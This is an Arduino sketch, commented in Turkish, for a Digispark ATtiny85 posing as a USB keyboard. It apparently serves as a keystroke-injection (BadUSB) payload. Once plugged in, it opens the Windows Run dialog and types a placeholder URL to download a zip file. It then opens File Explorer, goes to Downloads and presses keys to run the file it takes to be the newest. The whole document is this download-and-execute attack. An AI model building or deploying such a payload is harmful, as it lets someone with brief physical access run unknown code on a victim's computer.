#include <DigiKeyboard.h>  // DigiKeyboard kütüphanesini ekleyin

void setup() {
  // ATtiny85 için herhangi bir başlangıç işlemi gerekmiyor
}

void loop() {
  // DigiKeyboard ile klavye girişlerini gönder
  DigiKeyboard.sendKeyStroke(0);  // Bağlantının başlamasını bekleyin

  // Win + R tuş kombinasyonunu gönder
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // URL'yi yaz ve Enter tuşuna bas
  DigiKeyboard.print("https://example.com/file.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);  // Dosyanın inmesi için bekleyin, bu süreyi ayarlayın
  
  // Win + E tuş kombinasyonunu göndererek Dosya Gezgini'ni aç
  DigiKeyboard.sendKeyStroke(KEY_E, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // İndirilenler klasörüne git
  DigiKeyboard.print("Downloads");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // En son indirilen dosyayı çalıştırmak için End tuşuna bas
  DigiKeyboard.sendKeyStroke(KEY_END);
  DigiKeyboard.delay(500);

  // Enter tuşuna basarak dosyayı çalıştır
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Keyboard kullanımını bitir
  DigiKeyboard.end();

  // Loop döngüsünü durdur
  while (true) {
    // Sonsuz döngüye gir
  }
}
